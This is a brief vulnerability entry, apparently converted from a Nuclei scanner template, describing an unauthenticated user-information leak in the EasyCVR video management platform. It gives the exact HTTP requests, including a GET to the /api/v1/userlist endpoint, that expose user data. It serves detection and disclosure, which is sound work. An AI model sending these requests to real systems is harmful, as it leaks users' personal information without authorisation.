# Vulnerability: EasyCVR video management - Users Information Exposure
**Classification:** UNAUTH
**Source:** Nuclei Template (`easycvr-info-leak.yaml`)

## Description
EasyCVR video management platform has leaked user information

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}
GET {{BaseURL}}/api/v1/userlist?pageindex=0&pagesize=10
```

